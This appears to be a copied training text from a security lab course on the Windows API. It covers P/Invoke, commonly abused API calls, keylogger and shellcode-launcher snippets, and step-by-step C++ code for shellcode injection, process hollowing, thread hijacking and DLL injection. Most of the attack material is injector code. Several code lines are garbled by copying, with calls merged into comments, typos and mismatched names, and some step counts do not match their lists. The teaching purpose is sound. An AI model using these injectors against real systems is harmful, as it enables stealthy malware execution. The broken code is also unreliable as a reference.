Luckily, we do not have to dive deeper than that to continue working with API calls if we do not desire to do so.

Once the `windows.h` file is included at the top of an unmanaged program; any Win32 function can be called.

We will cover this concept at a more practical level in task 6.

# P/Invoke

Microsoft
 describes P/Invoke or platform invoke as “a technology that allows you 
to access structs, callbacks, and functions in unmanaged libraries from 
your managed code.”

P/invoke provides tools to handle the entire 
process of invoking an unmanaged function from managed code or, in other
 words, calling the Win32 API. P/invoke will kick off by importing the 
desired DLL that contains the unmanaged function or Win32 API call. 
Below is an example of importing a DLL with options.

```csharp
using System;
using System.Runtime.InteropServices;

public class Program
{
[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
...
}
```

In the above code, we are importing the DLL `user32` using the attribute: `DLLImport`.

Note:
 a semicolon is not included because the p/invoke function is not yet 
complete. In the second step, we must define a managed method as an 
external one. The `extern` keyword will inform the runtime of
 the specific DLL that was previously imported. Below is an example of 
creating the external method.

```csharp
using System;
using System.Runtime.InteropServices;

public class Program
{
...
private static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, uint uType);
}
```

Now we can invoke the function as a managed method, but we are calling the unmanaged function!

API Call Structur**e**

API calls are the 
second main component of the Win32 library. These calls offer 
extensibility and flexibility that can be used to meet a plethora of use
 cases. Most Win32 API calls are well documented under the [Windows API documentation](https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list) and [pinvoke.net](http://pinvoke.net/).

In this task, we will take an introductory look at naming schemes and in/out parameters of API calls.

API call functionality can be extended by modifying the naming 
scheme and appending a representational character. Below is a table of 
the characters Microsoft supports for its naming scheme.

| **Character** | **Explanation** |
| --- | --- |
| A | Represents an 8-bit character set with ANSI encoding |
| W | Represents a Unicode encoding |
| Ex | Provides extended functionality or in/out parameters to the API call |

For more information about this concept, check out the [Microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/learnwin32/working-with-strings).

---

Each
 API call also has a pre-defined structure to define its in/out 
parameters. You can find most of these structures on the corresponding 
API call document page of the [Windows documentation](https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list), along with explanations of each I/O parameter.

Let’s take a look at the `WriteProcessMemory` API call as an example. Below is the I/O structure for the call obtained [here](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory).

```cpp
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);

```

For each I/O parameter, Microsoft also explains its use, expected input or output, and accepted values.

Even with an explanation determining these values can sometimes 
be challenging for particular calls. We suggest always researching and 
finding examples of API call usage before using a call in your code.

**C API Implementations**

Microsoft provides 
low-level programming languages such as C and C++ with a pre-configured 
set of libraries that we can use to access needed API calls.

The `windows.h`
 header file, as discussed in task 4, is used to define call structures 
and obtain function pointers. To include the windows header, prepend the
 line below to any C or C++ program.

`#include <windows.h>`

Let’s
 jump right into creating our first API call. As our first objective, we
 aim to create a pop-up window with the title: “Hello THM!” using `CreateWindowExA`. To reiterate what was covered in task 5, let’s observe the in/out parameters of the call.

```cpp
HWND CreateWindowExA(
  [in]           DWORD     dwExStyle, // Optional windows styles
  [in, optional] LPCSTR    lpClassName, // Windows class
  [in, optional] LPCSTR    lpWindowName, // Windows text
  [in]           DWORD     dwStyle, // Windows style
  [in]           int       X, // X position
  [in]           int       Y, // Y position
  [in]           int       nWidth, // Width size
  [in]           int       nHeight, // Height size
  [in, optional] HWND      hWndParent, // Parent windows
  [in, optional] HMENU     hMenu, // Menu
  [in, optional] HINSTANCE hInstance, // Instance handle
  [in, optional] LPVOID    lpParam // Additional application data
);

```

Let’s take these pre-defined parameters and assign 
values to them. As mentioned in task 5, each parameter for an API call 
has an explanation of its purpose and potential values. Below is an 
example of a complete call to `CreateWindowsExA`.

```cpp
HWND hwnd = CreateWindowsEx(
	0,
	CLASS_NAME,
	L"Hello THM!",
	WS_OVERLAPPEDWINDOW,
	CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
	NULL,
	NULL,
	hInstance,
	NULL
	);

```

We’ve defined our first API call in C! Now we can 
implement it into an application and use the functionality of the API 
call. Below is an example application that uses the API to create a 
small blank window.

```cpp
BOOL Create(
        PCWSTR lpWindowName,
        DWORD dwStyle,
        DWORD dwExStyle = 0,
        int x = CW_USEDEFAULT,
        int y = CW_USEDEFAULT,
        int nWidth = CW_USEDEFAULT,
        int nHeight = CW_USEDEFAULT,
        HWND hWndParent = 0,
        HMENU hMenu = 0
        )
    {
        WNDCLASS wc = {0};

        wc.lpfnWndProc   = DERIVED_TYPE::WindowProc;
        wc.hInstance     = GetModuleHandle(NULL);
        wc.lpszClassName = ClassName();

        RegisterClass(&wc);

        m_hwnd = CreateWindowEx(
            dwExStyle, ClassName(), lpWindowName, dwStyle, x, y,
            nWidth, nHeight, hWndParent, hMenu, GetModuleHandle(NULL), this
            );

        return (m_hwnd ? TRUE : FALSE);
    }

```

If successful, we should see a window with the title “Hello THM!”.

As demonstrated throughout this task, low-level languages make it
 very easy to define an API call quickly. Because of the ease of use and
 extensibility, C-based languages are the most popular among threat 
actors and vendors alike.

**.NET and PowerShell API Implementations**

As discussed in task 4, **P/Invoke** allows us to import DLLs and assign pointers to API calls.

To
 understand how P/Invoke is implemented, let’s jump right into it with 
an example below and discuss individual components afterward.

```cpp
class Win32 {
	[DllImport("kernel32")]
	public static extern IntPtr GetComputerNameA(StringBuilder lpBuffer, ref uint lpnSize);
}

```

The class function stores defined API calls and a definition to reference in all future methods.

The library in which the API call structure is stored must now be imported using `DllImport`.
 The imported DLLs act similar to the header packages but require that 
you import a specific DLL with the API call you are looking for. You can
 reference the [API index](https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list) or [pinvoke.net](http://pinvoke.net/) to determine where a particular API call is located in a DLL.

From the DLL import, we can create a new pointer to the API call we want to use, notably defined by `intPtr`.
 Unlike other low-level languages, you must specify the in/out parameter
 structure in the pointer. As discussed in task 5, we can find the 
in/out parameters for the required API call from the Windows 
documentation.

Now we can implement the defined API call into an 
application and use its functionality. Below is an example application 
that uses the API to get the computer name and other information of the 
device it is run on.

```csharp
class Win32 {
	[DllImport("kernel32")]
	public static extern IntPtr GetComputerNameA(StringBuilder lpBuffer, ref uint lpnSize);
}

static void Main(string[] args) {
	bool success;
	StringBuilder name = new StringBuilder(260);
	uint size = 260;
	success = GetComputerNameA(name, ref size);
	Console.WriteLine(name.ToString());
}

```

If successful, the program should return the computer name of the current device.

Now that we’ve covered how it can be accomplished in .NET let’s look at how we can adapt the same syntax to work in PowerShell.

Defining
 the API call is almost identical to .NET’s implementation, but we will 
need to create a method instead of a class and add a few additional 
operators.

```powershell
$MethodDefinition = @"
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@;

```

The calls are now defined, but PowerShell requires one 
further step before they can be initialized. We must create a new type 
for the pointer of each Win32 DLL within the method definition. The 
function `Add-Type` will drop a temporary file in the `/temp` directory and compile needed functions using `csc.exe`. Below is an example of the function being used.

```powershell
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;

```

We can now use the required API calls with the syntax below.

`[Win32.Kernel32]::<Imported Call>()`

**Commonly Abused API Calls**

Several API calls within the Win32 library lend themselves to be easily leveraged for malicious activity.

Several entities have attempted to document and organize all available API calls with malicious vectors, including [SANs](https://www.sans.org/white-papers/33649/) and [MalAPI.io](http://malapi.io/).

While many calls are abused, some are seen in the wild more than 
others. Below is a table of the most commonly abused API organized by 
frequency in a collection of samples.

| **API Call** | **Explanation** |
| --- | --- |
| LoadLibraryA | Maps a specified DLL
 into the address space of the calling process |
| GetUserNameA | Retrieves the name of the user associated with the current thread |
| GetComputerNameA | Retrieves a NetBIOS or DNS
 name of the local computer |
| GetVersionExA | Obtains information about the version of the operating system currently running |
| GetModuleFileNameA | Retrieves the fully qualified path for the file of the specified module and process |
| GetStartupInfoA | Retrieves contents of STARTUPINFO structure (window station, desktop, standard handles, and appearance of a process) |
| GetModuleHandle | Returns a module handle for the specified module if mapped into the calling process's address space |
| GetProcAddress | Returns the address of a specified exported DLL
 function |
| VirtualProtect | Changes the protection on a region of memory in the virtual address space of the calling process |

**Malware Case Study**

Now that we understand 
the underlying implementations of the Win32 library and commonly abused 
API calls, let’s break down two malware samples and observe how their 
calls interact.

In this task, we will be breaking down a C# keylogger and shellcode launcher.

# Keylogger

To
 begin analyzing the keylogger, we need to collect which API calls and 
hooks it is implementing. Because the keylogger is written in C#, it 
must use P/Invoke to obtain pointers for each call. Below is a snippet 
of the p/invoke definitions of the malware sample source code.

```csharp
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
private static extern bool UnhookWindowsHookEx(IntPtr hhk);
[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr GetModuleHandle(string lpModuleName);
private static int WHKEYBOARDLL = 13;
[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr GetCurrentProcess();

```

Below is an explanation of each API call and its respective use.

| **API Call** | **Explanation** |
| --- | --- |
| SetWindowsHookEx | Installs a memory hook into a hook chain to monitor for certain events |
| UnhookWindowsHookEx | Removes an installed hook from the hook chain |
| GetModuleHandle | Returns a module handle for the specified module if mapped into the calling process's address space |
| GetCurrentProcess | Retrieves a pseudo handle for the current process. |

To
 maintain the ethical integrity of this case study, we will not cover 
how the sample collects each keystroke. We will analyze how the sample 
sets a hook on the current process. Below is a snippet of the hooking 
section of the malware sample source code.

```csharp
public static void Main() {
	_hookID = SetHook(_proc);
	Application.Run();
	UnhookWindowsHookEx(_hookID);
	Application.Exit();
}
private static IntPtr SetHook(LowLevelKeyboardProc proc) {
	using (Process curProcess = Process.GetCurrentProcess()) {
		return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
	}
}
```

Let’s understand the objective and procedure of the keylogger, then assign their respective API call from the above snippet.

Using the [Windows API documentation](https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list) and
 the context of the above snippet, begin analyzing the keylogger, using 
questions 1 - 4 as a guide to  work through the sample.

# Shellcode Launcher

To
 begin analyzing the shellcode launcher, we once again need to collect 
which API calls it is implementing. This process should look identical 
to the previous case study. Below is a snippet of the p/invoke 
definitions of the malware sample source code.

```csharp
private static UInt32 MEM_COMMIT = 0x1000;
private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
[DllImport("kernel32")]
private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
[DllImport("kernel32")]
private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
[DllImport("kernel32")]
private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

```

Below is an explanation of each API call and its respective use.

| **API Call** | **Explanation** |
| --- | --- |
| VirtualAlloc | Reserves, commits, or changes the state of a region of pages in the virtual address space of the calling process. |
| WaitForSingleObject | Waits until the specified object is in the signaled state or the time-out interval elapses |
| CreateThread | Creates a thread to execute within the virtual address space of the calling process |

We will now analyze how the shellcode is written to and executed from memory.

```csharp
UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
IntPtr hThread = IntPtr.Zero;
UInt32 threadId = 0;
IntPtr pinfo = IntPtr.Zero;
hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
WaitForSingleObject(hThread, 0xFFFFFFFF);
return;

```

Let’s understand the objective and procedure of 
shellcode execution, then assign their respective API call from the 
above snippet.

Using the [Windows API documentation](https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list)
 and the context of the above snippet, begin analyzing the shellcode 
launcher, using questions 5 - 8 as a guide to  work through the sample.

## **ABUSING WINDOWS INTERNALS**

**Abusing Processes**

Applications running on
 your operating system can contain one or more processes. Processes 
maintain and represent a program that’s being executed.

Processes have a lot of other sub-components and directly 
interact with memory or virtual memory, making them a perfect candidate 
to target. The table below describes each critical component of 
processes and their purpose.

| **Process Component** | **Purpose** |
| --- | --- |
| Private Virtual Address Space | Virtual memory addresses the process is allocated. |
| Executable Program | Defines code and data stored in the virtual address space |
| Open Handles | Defines handles to system resources accessible to the process |
| Security Context | The access token defines the user, security groups, privileges, and other security information. |
| Process ID | Unique numerical identifier of the process |
| Threads | Section of a process scheduled for execution |

For more information about processes, check out the [Windows Internals room](https://tryhackme.com/room/windowsinternals).

Process injection is commonly used as an overarching term to 
describe injecting malicious code into a process through legitimate 
functionality or components. We will focus on four different types of 
process injection in this room, outlined below.

| **Injection Type** | **Function** |
| --- | --- |
| [Process Hollowing](https://attack.mitre.org/techniques/T1055/012/) | Inject code into a suspended and “hollowed” target process |
| [Thread Execution Hijacking](https://attack.mitre.org/techniques/T1055/003/) | Inject code into a suspended target thread |
| [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001/) | Inject a DLL into process memory |
| [Portable Executable Injection](https://attack.mitre.org/techniques/T1055/002/) | Self-inject a PE image pointing to a malicious function into a target process |

There are many other forms of process injection outlined by [MITRE T1055](https://attack.mitre.org/techniques/T1055/).

At its most basic level, process injection takes the form of shellcode injection.

At a high level, shellcode injection can be broken up into four steps:

1. Open a target process with all access rights.
2. Allocate target process memory for the shellcode.
3. Write shellcode to allocated memory in the target process.
4. Execute the shellcode using a remote thread.

The steps can also be broken down graphically to depict how Windows API calls interact with process memory.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/ba04c5ef220c10b3e174bd1ca77959c6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/ba04c5ef220c10b3e174bd1ca77959c6.png)

We will break down a basic shellcode injector to identify each of the steps and explain in more depth below.

At step one of shellcode injection, we need to open a target process using special parameters. `OpenProcess` is used to open the target process supplied via the command-line.

```cpp
processHandle = OpenProcess(
	PROCESS_ALL_ACCESS, // Defines access rights
	FALSE, // Target handle will not be inhereted
	DWORD(atoi(argv[1])) // Local process supplied by command-line arguments
);

```

At step two, we must allocate memory to the byte size of the shellcode. Memory allocation is handled using `VirtualAllocEx`. Within the call, the `dwSize` parameter is defined using the `sizeof` function to get the bytes of shellcode to allocate.

```cpp
remoteBuffer = VirtualAllocEx(
	processHandle, // Opened target process
	NULL,
	sizeof shellcode, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);

```

At step three, we can now use the allocated memory region to write our shellcode. `WriteProcessMemory` is commonly used to write to memory regions.

```cpp
WriteProcessMemory(
	processHandle, // Opened target process
	remoteBuffer, // Allocated memory region
	shellcode, // Data to write
	sizeof shellcode, // byte size of data
	NULL
);

```

At step four, we now have control of the process, and 
our malicious code is now written to memory. To execute the shellcode 
residing in memory, we can use `CreateRemoteThread`; threads control the execution of processes.

```cpp
remoteThread = CreateRemoteThread(
	processHandle, // Opened target process
	NULL,
	0, // Default size of the stack
	(LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread
	NULL,
	0, // Ran immediately after creation
	NULL
);

```

We can compile these steps 
together to create a basic process injector. Use the C++ injector 
provided and experiment with process injection.

Shellcode injection is the most basic form of process injection; 
in the next task, we will look at how we can modify and adapt these 
steps for process hollowing.

**Expanding Process Abuse**

In the previous 
task, we discussed how we can use shellcode injection to inject 
malicious code into a legitimate process. In this task we will cover 
process hollowing. Similar to shellcode injection, this technique offers
 the ability to inject an entire malicious file into a process. This is 
accomplished by “hollowing” or un-mapping the process and injecting 
specific PE (**P**ortable **E**xecutable) data and sections into the process.

At a high-level process hollowing can be broken up into six steps:

1. Create a target process in a suspended state.
2. Open a malicious image.
3. Un-map legitimate code from process memory.
4. Allocate memory locations for malicious code and write each section into the address space.
5. Set an entry point for the malicious code.
6. Take the target process out of a suspended state.

The steps can also be broken down graphically to depict how Windows API calls interact with process memory.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3c36b4470fb04e3bfdbbef0674b79ec2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3c36b4470fb04e3bfdbbef0674b79ec2.png)

We will break down a basic process hollowing injector to identify each of the steps and explain in more depth below.

At step one of process hollowing, we must create a target process in a suspended state using `CreateProcessA`. To obtain the required parameters for the API call we can use the structures `STARTUPINFOA` and `PROCESS_INFORMATION`.

```cpp
LPSTARTUPINFOA target_si = new STARTUPINFOA(); // Defines station, desktop, handles, and appearance of a process
LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION(); // Information about the process and primary thread
CONTEXT c; // Context structure pointer

if (CreateProcessA(
	(LPSTR)"C:\\\\Windows\\\\System32\\\\svchost.exe", // Name of module to execute
	NULL,
	NULL,
	NULL,
	TRUE, // Handles are inherited from the calling process
	CREATE_SUSPENDED, // New process is suspended
	NULL,
	NULL,
	target_si, // pointer to startup info
	target_pi) == 0) { // pointer to process information
	cout << "[!] Failed to create Target process. Last Error: " << GetLastError();
	return 1;

```

In step two, we need to open a malicious image to inject. This process is split into three steps, starting by using `CreateFileA` to obtain a handle for the malicious image.

```cpp
HANDLE hMaliciousCode = CreateFileA(
	(LPCSTR)"C:\\\\Users\\\\tryhackme\\\\malware.exe", // Name of image to obtain
	GENERIC_READ, // Read-only access
	FILE_SHARE_READ, // Read-only share mode
	NULL,
	OPEN_EXISTING, // Instructed to open a file or device if it exists
	NULL,
	NULL
);

```

Once a handle for the malicious image is obtained, memory must be allocated to the local process using `VirtualAlloc`. `GetFileSize` is also used to retrieve the size of the malicious image for `dwSize`.

```cpp
DWORD maliciousFileSize = GetFileSize(
	hMaliciousCode, // Handle of malicious image
	0 // Returns no error
);

PVOID pMaliciousImage = VirtualAlloc(
	NULL,
	maliciousFileSize, // File size of malicious image
	0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
	0x04 // Enables read/write access (PAGE_READWRITE)
);

```

Now that memory is allocated to the local process, it must be 
written. Using the information obtained from previous steps, we can use `ReadFile` to write to local process memory.

```cpp
DWORD numberOfBytesRead; // Stores number of bytes read

if (!ReadFile(
	hMaliciousCode, // Handle of malicious image
	pMaliciousImage, // Allocated region of memory
	maliciousFileSize, // File size of malicious image
	&numberOfBytesRead, // Number of bytes read
	NULL
	)) {
	cout << "[!] Unable to read Malicious file into memory. Error: " <<GetLastError()<< endl;
	TerminateProcess(target_pi->hProcess, 0);
	return 1;
}

CloseHandle(hMaliciousCode);

```

At step three, the process must be “hollowed” by un-mapping 
memory. Before un-mapping can occur, we must identify the parameters of 
the API call. We need to identify the location of the process in memory and the entry point. The CPU registers `EAX` (entry point), and `EBX` (PEB location) contain the information we need to obtain; these can be found by using `GetThreadContext`. Once both registers are found, `ReadProcessMemory` is used to obtain the base address from the `EBX` with an offset (`0x8`), obtained from examining the PEB.

```cpp
c.ContextFlags = CONTEXT_INTEGER; // Only storesCPU registers in the pointerGetThreadContext(
	target_pi->hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
	&c // Pointer to store retrieved context
); // Obtains the current thread context

PVOID pTargetImageBaseAddress;
ReadProcessMemory(
	target_pi->hProcess, // Handle for the process obtained from the PROCESS_INFORMATION structure
	(PVOID)(c.Ebx + 8), // Pointer to the base address
	&pTargetImageBaseAddress, // Store target base address
	sizeof(PVOID), // Bytes to read
	0 // Number of bytes out
);

```

After the base address is stored, we can begin un-mapping memory. We can use `ZwUnmapViewOfSection` imported from *ntdll.dll* to free memory from the target process.

```cpp
HMODULE hNtdllBase = GetModuleHandleA("ntdll.dll"); // Obtains the handle for ntdll
pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(
	hNtdllBase, // Handle of ntdll
	"ZwUnmapViewOfSection" //API call to obtain); // Obtains ZwUnmapViewOfSection from ntdll

DWORD dwResult = pZwUnmapViewOfSection(
	target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
	pTargetImageBaseAddress // Base address of the process
);

```

At step four, we must begin by allocating memory in the hollowed process. We can use `VirtualAlloc` similar to *step two* to allocate memory. This time we need to obtain the size of the image found in file headers. `e_lfanew` can identify the number of bytes from the DOS header to the PE header. Once at the PE header, we can obtain the `SizeOfImage` from the Optional header.

```cpp
PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage; // Obtains theDOS header from the malicious image
PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew); // Obtains the NT header from e_lfanew

DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage; // Obtains the size of the optional header from the NT header structure

PVOID pHollowAddress = VirtualAllocEx(
	target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
	pTargetImageBaseAddress, // Base address of the process
	sizeOfMaliciousImage, // Byte size obtained from optional header
	0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
	0x40 // Enabled execute and read/write access (PAGE_EXECUTE_READWRITE)
);

```

Once the memory is allocated, we can write the malicious file to memory. Because we are writing a file, we must first write the PE headers then the PE sections. To write PE headers, we can use `WriteProcessMemory` and the size of headers to determine where to stop.

```cpp
if (!WriteProcessMemory(
	target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
	pTargetImageBaseAddress, // Base address of the process
	pMaliciousImage, // Local memory where the malicious file resides
	pNTHeaders->OptionalHeader.SizeOfHeaders, // Byte size ofPE headers NULL
)) {
	cout<< "[!] Writting Headers failed. Error: " << GetLastError() << endl;
}

```

Now we need to write each section. To find the number of sections, we can use  `NumberOfSections` from the NT headers. We can loop through `e_lfanew` and the size of the current header to write each section.

```cpp
for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) { // Loop based on number of sections inPE data
	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER))); // Determines the currentPE section headerWriteProcessMemory(
		target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
		(PVOID)((LPBYTE)pHollowAddress + pSectionHeader->VirtualAddress), // Base address of current section
		(PVOID)((LPBYTE)pMaliciousImage + pSectionHeader->PointerToRawData), // Pointer for content of current section
		pSectionHeader->SizeOfRawData, // Byte size of current section
		NULL
	);
}

```

It is also possible to use relocation tables to write the file to target memory. This will be discussed in more depth in task 6.

At step five, we can use `SetThreadContext` to change `EAX` to point to the entry point.

```cpp
c.Eax = (SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint); // Set the context structure pointer to the entry point from thePE optional headerSetThreadContext(
	target_pi->hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
	&c // Pointer to the stored context structure
);

```

At step six, we need to take the process out of a suspended state using `ResumeThread`.

```cpp
ResumeThread(
	target_pi->hThread // Handle to the thread obtained from the PROCESS_INFORMATION structure
);

```

We can compile these steps together to create a process hollowing 
injector. Use the C++ injector provided and experiment with process 
hollowing.

**Abusing Process Components**

At a high-level thread (execution) hijacking can be broken up into eleven steps:

1. Locate and open a target process to control.
2. Allocate memory region for malicious code.
3. Write malicious code to allocated memory.
4. Identify the thread ID of the target thread to hijack.
5. Open the target thread.
6. Suspend the target thread.
7. Obtain the thread context.
8. Update the instruction pointer to the malicious code.
9. Rewrite the target thread context.
10. Resume the hijacked thread.

We will break down a basic thread hijacking script to identify each of the steps and explain in more depth below.

The first three steps outlined in this technique following the same 
common steps as normal process injection. These will not be explained, 
instead, you can find the documented source code below.

```cpp
HANDLE hProcess = OpenProcess(
	PROCESS_ALL_ACCESS, // Requests all possible access rights
	FALSE, // Child processes do not inheret parent process handle
	processId // Stored process ID
);
PVOIF remoteBuffer = VirtualAllocEx(
	hProcess, // Opened target process
	NULL,
	sizeof shellcode, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);
WriteProcessMemory(
	processHandle, // Opened target process
	remoteBuffer, // Allocated memory region
	shellcode, // Data to write
	sizeof shellcode, // byte size of data
	NULL
);

```

Once the initial steps are out of the way and our shellcode is 
written to memory we can move to step four. At step four, we need to 
begin the process of hijacking the process thread by identifying the 
thread ID. To identify the thread ID we need to use a trio of Windows API calls: `CreateToolhelp32Snapshot()`, `Thread32First()`, and `Thread32Next()`. These API calls will collectively loop through a snapshot of a process and extend capabilities to enumerate process information.

```cpp
THREADENTRY32 threadEntry;

HANDLE hSnapshot = CreateToolhelp32Snapshot( // Snapshot the specificed process
	TH32CS_SNAPTHREAD, // Include all processes residing on the system
	0 // Indicates the current process
);
Thread32First( // Obtains the first thread in the snapshot
	hSnapshot, // Handle of the snapshot
	&threadEntry // Pointer to the THREADENTRY32 structure
);

while (Thread32Next( // Obtains the next thread in the snapshot
	snapshot, // Handle of the snapshot
	&threadEntry // Pointer to the THREADENTRY32 structure
)) {

```

At step five, we have gathered all the required information in the 
structure pointer and can open the target thread. To open the thread we 
will use `OpenThread` with the `THREADENTRY32` structure pointer.

```cpp
if (threadEntry.th32OwnerProcessID == processID) // Verifies both parent process ID's match
		{
			HANDLE hThread = OpenThread(
				THREAD_ALL_ACCESS, // Requests all possible access rights
				FALSE, // Child threads do not inheret parent thread handle
				threadEntry.th32ThreadID // Reads the thread ID from the THREADENTRY32 structure pointer
			);
			break;
		}

```

At step six, we must suspend the opened target thread. To suspend the thread we can use `SuspendThread`.

```cpp
SuspendThread(hThread);

```

At step seven, we need to obtain the thread context to use in the upcoming API calls. This can be done using `GetThreadContext` to store a pointer.

```cpp
CONTEXT context;
GetThreadContext(
	hThread, // Handle for the thread
	&context // Pointer to store the context structure
);

```

At step eight, we need to overwrite RIP (Instruction Pointer 
Register) to point to our malicious region of memory. If you are not 
already familiar with CPU
 registers, RIP is an x64 register that will determine the next code 
instruction; in a nutshell, it controls the flow of an application in 
memory. To overwrite the register we can update the thread context for 
RIP.

```cpp
context.Rip = (DWORD_PTR)remoteBuffer; // Points RIP to our malicious buffer allocation

```

At step nine, the context is updated and needs to be updated to the current thread context. This can be easily done using `SetThreadContext` and the pointer for the context.

```cpp
SetThreadContext(
	hThread, // Handle for the thread
	&context // Pointer to the context structure
);

```

At the final step, we can now take the target thread out of a suspended state. To accomplish this we can use `ResumeThread`.

```cpp
ResumeThread(
	hThread // Handle for the thread
);

```

We can compile these steps together to create a process injector via 
thread hijacking. Use the C++ injector provided and experiment with 
thread hijacking.

**Abusing DLLs**

At a high-level DLL injection can be broken up into six steps:

1. Locate a target process to inject.
2. Open the target process.
3. Allocate memory region for malicious DLL.
4. Write the malicious DLL to allocated memory.
5. Load and execute the malicious DLL.

We will break down a basic DLL injector to identify each of the steps and explain in more depth below.

At step one of DLL injection, we must locate a target thread. A thread can be located from a process using a trio of Windows API calls: `CreateToolhelp32Snapshot()`, `Process32First()`, and `Process32Next()`.

```cpp
DWORD getProcessId(const char *processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot( // Snapshot the specificed process
			TH32CS_SNAPPROCESS, // Include all processes residing on the system
			0 // Indicates the current process
		);
    if (hSnapshot) {
        PROCESSENTRY32 entry; // Adds a pointer to the PROCESSENTRY32 structure
        entry.dwSize = sizeof(PROCESSENTRY32); // Obtains the byte size of the structure
        if (Process32First( // Obtains the first process in the snapshot
					hSnapshot, // Handle of the snapshot
					&entry // Pointer to the PROCESSENTRY32 structure
				)) {
            do {
                if (!strcmp( // Compares two strings to determine if the process name matches
									entry.szExeFile, // Executable file name of the current process from PROCESSENTRY32
									processName // Supplied process name
								)) {
                    return entry.th32ProcessID; // Process ID of matched process
                }
            } while (Process32Next( // Obtains the next process in the snapshot
							hSnapshot, // Handle of the snapshot
							&entry
						)); // Pointer to the PROCESSENTRY32 structure
        }
    }

DWORD processId = getProcessId(processName); // Stores the enumerated process ID

```

At step two, after the PID has been enumerated, we need to open the process. This can be accomplished from a variety of Windows API calls: `GetModuleHandle`, `GetProcAddress`, or `OpenProcess`.

```cpp
HANDLE hProcess = OpenProcess(
	PROCESS_ALL_ACCESS, // Requests all possible access rights
	FALSE, // Child processes do not inheret parent process handle
	processId // Stored process ID
);

```

At step three, memory must be allocated for the provided malicious DLL to reside. As with most injectors, this can be accomplished using `VirtualAllocEx`.

```cpp
LPVOID dllAllocatedMemory = VirtualAllocEx(
	hProcess, // Handle for the target process
	NULL,
	strlen(dllLibFullPath), // Size of theDLL path
	MEM_RESERVE | MEM_COMMIT, // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);

```

